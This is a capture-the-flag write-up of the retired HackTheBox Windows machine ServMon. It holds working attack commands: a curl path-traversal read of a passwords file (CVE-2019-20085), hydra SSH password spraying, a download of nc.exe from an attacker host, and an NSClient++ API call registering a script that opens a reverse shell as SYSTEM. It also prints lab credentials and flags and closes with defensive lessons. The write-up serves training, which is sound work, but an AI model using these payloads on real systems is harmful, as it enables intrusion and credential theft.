# ServMon — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Active Directory | No |
| IP | 10.129.227.77 |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/servmon](https://jostif.pages.dev/writeups/servmon) |

**Techniques:** Anonymous FTP → credential leak → CVE-2019-20085 (NVMS path traversal) → password spray SSH → NSClient++ API abuse → SYSTEM

---

---

## Attack Chain

```
Anonymous FTP → Confidential.txt leak → NVMS Path Traversal (CVE-2019-20085)
→ Passwords.txt → SSH (nadine) → NSClient++ API → SYSTEM
```

---

## Overview

ServMon chains four weaknesses together:

1. Anonymous FTP exposes internal notes between two users
2. A note reveals that `Passwords.txt` is sitting on Nathan's Desktop
3. NVMS-1000 has an unauthenticated directory traversal (CVE-2019-20085) that lets us read that file
4. Password spraying over SSH lands a shell as `nadine`
5. NSClient++ — a monitoring agent running as SYSTEM — exposes a REST API we abuse to execute a reverse shell

---

## 1. Recon

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.227.77
```

### Key Open Ports

| Port  | Service            | Notes                                      |
|-------|--------------------|--------------------------------------------|
| 21    | FTP (Microsoft)    | Anonymous login allowed                    |
| 22    | SSH (OpenSSH Win)  | OpenSSH for Windows 8.0                    |
| 80    | HTTP               | Redirects to `/Pages/login.htm` — NVMS-1000 |
| 445   | SMB                | Signing not required                       |
| 8443  | HTTPS              | NSClient++ web UI                          |

> **What is NVMS-1000?**  
> A network video surveillance management system by TVT. It has a known unauthenticated directory traversal vulnerability (CVE-2019-20085) that allows reading arbitrary files from the host without any credentials.

> **What is NSClient++?**  
> A Windows monitoring agent (similar to Nagios NRPE) that runs as `NT AUTHORITY\SYSTEM`. It exposes a REST API on port 8443 and can execute external scripts — making it a classic privesc target.

---

## 2. FTP Enumeration

Nmap confirms anonymous FTP is allowed. Connect and browse:

```bash
ftp -p 10.129.227.77
# Username: anonymous
# Password: (blank)

ftp> cd Users
ftp> cd Nadine
ftp> get Confidential.txt

ftp> cd ../Nathan
ftp> get "Notes to do.txt"
```

### Confidential.txt (from Nadine to Nathan)

```
Nathan,

I left your Passwords.txt file on your Desktop. Please remove this once
you have edited it yourself and place it back into the secure folder.

Regards
Nadine
```

### Notes to do.txt (Nathan's TODO list)

```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS           <-- NOT done
5) Place the secret files in SharePoint
```

> **Key insight:** Nathan's `Passwords.txt` is on his Desktop, and NVMS public access hasn't been removed yet (item 4 is incomplete). We can combine these: use the NVMS traversal to read the passwords file.

---

## 3. Directory Traversal — CVE-2019-20085

NVMS-1000 fails to sanitize `../` sequences in GET requests, allowing unauthenticated file reads anywhere on the filesystem.

Standard Python exploit scripts fail here because URL libraries silently normalize (strip) the `../` sequences before the request hits the server. Use `curl` with `--path-as-is` to prevent this:

```bash
curl --path-as-is \
  "http://10.129.227.77/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt"
```

Output:

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Save these to `passwords.txt`. Create a `users.txt` with both known users:

```
nadine
nathan
```

> **Why `--path-as-is`?**  
> By default, curl normalizes URLs and strips `../` before sending. This flag disables normalization and sends the raw path to the server exactly as written — which is what the exploit requires.

---

## 4. Foothold — SSH as Nadine

Spray the recovered passwords against SSH:

```bash
hydra -L users.txt -P passwords.txt ssh://10.129.227.77
```

```
[22][ssh] host: 10.129.227.77   login: nadine   password: L1k3B1gBut7s@W0rk
```

> Nathan's password wasn't in the list. The file was *his* passwords, but Nadine reused one of them.

```bash
ssh nadine@10.129.227.77
# Password: L1k3B1gBut7s@W0rk
```

```cmd
nadine@SERVMON C:\Users\Nadine\Desktop> type user.txt
2687b43660901e4b7f9c825ef144ff80
```

**User flag:** `2687b43660901e4b7f9c825ef144ff80`

---

## 5. Privilege Escalation — NSClient++ → SYSTEM

NSClient++ is bound to `0.0.0.0:8443` (confirmed via `netstat -ano`) but its config restricts API connections to `127.0.0.1` only. We bypass this with an SSH tunnel. The REST API lets authenticated users register and execute external scripts — and the service runs as SYSTEM.

### Step 1 — Read nsclient.ini

```cmd
type "C:\Program Files\NSClient++\nsclient.ini"
```

Relevant lines:

```ini
[/settings/default]
password = ew2x6SsGTxjRwXOT
allowed hosts = 127.0.0.1
```

### Step 2 — SSH Port Forward

Forward local port 8443 on Kali to localhost:8443 on the target:

```bash
ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77 -N -f
```

Verify it's listening:

```bash
ss -tlnp | grep 8443
# LISTEN  0  128  127.0.0.1:8443  0.0.0.0:*
```

> **If the port is already in use from a previous tunnel:**
> ```bash
> sudo fuser -k 8443/tcp
> ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77 -N -f
> ```

### Step 3 — Test API Access

```bash
curl -k --tlsv1.0 -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/info
```

Expected response:

```json
{"name":"NSClient++","version":"0.5.2.35 2018-01-28",...}
```

> **TLS gotcha:** NSClient++ 0.5.2 uses old TLS. Use `-k` (skip cert verification) and `--tlsv1.0` (allow TLS 1.0). Always run these curl commands from **Kali** — the Windows curl inside the SSH session uses `schannel` which also fails with SSL errors.

### Step 4 — Upload nc.exe to Target

On Kali:

```bash
cp /usr/share/windows-binaries/nc.exe .
python3 -m http.server 8080
```

In the SSH session on the target:

```cmd
mkdir C:\Temp
curl http://YOUR_KALI_IP:8080/nc.exe -o C:\Temp\nc.exe
```

### Step 5 — Register Malicious Script via API

From Kali (through the tunnel):

```bash
curl -k --tlsv1.0 -u admin:ew2x6SsGTxjRwXOT \
  -X PUT "https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat" \
  --data-binary "C:\\Temp\\nc.exe YOUR_KALI_IP 4444 -e cmd.exe"
```

Expected response: `Added evil as scripts\evil.bat`

### Step 6 — Start Listener and Execute

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — trigger the script
curl -k --tlsv1.0 -u admin:ew2x6SsGTxjRwXOT \
  "https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=3m"
```

Shell received:

```
connect to [10.10.14.78] from (UNKNOWN) [10.129.227.77]

C:\Program Files\NSClient++> whoami
nt authority\system
```

### Step 7 — Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
27da63c023e43261d67c214f9f982426
```

**Root flag:** `27da63c023e43261d67c214f9f982426`

> **Why does this work?**  
> NSClient++ runs as a Windows service under `NT AUTHORITY\SYSTEM`. When it executes our registered script, the spawned process inherits that SYSTEM context — giving us the highest privilege level on the machine with no further exploitation needed.

---

## 6. Credentials Summary

| User          | Credential            | Source                    |
|---------------|-----------------------|---------------------------|
| nadine        | `L1k3B1gBut7s@W0rk`  | NVMS traversal + SSH spray |
| NSClient++ API | `ew2x6SsGTxjRwXOT`  | nsclient.ini plaintext    |

---

## 7. Lessons Learned

**Anonymous FTP is dangerous.**  
Leaving internal notes on an FTP share accessible without credentials is a common misconfiguration that immediately leaks the attack path.

**Never leave sensitive files on user Desktops.**  
The password file's location was disclosed in a plaintext note — and the NVMS traversal let us read the file with zero authentication.

**Unpatched web software is a serious risk.**  
CVE-2019-20085 was disclosed in 2019. Public access to NVMS hadn't been removed — Nathan's own TODO list noted this as pending.

**Monitoring agents running as SYSTEM need tight controls.**  
NSClient++ stored its API password in plaintext. The localhost restriction was trivially bypassed with an SSH tunnel. External script execution + SYSTEM privileges = instant full compromise.

**Use `--path-as-is` when testing path traversal.**  
Most tools and HTTP libraries silently normalize away `../` sequences before the request hits the server. This flag is essential for testing traversal payloads with curl.
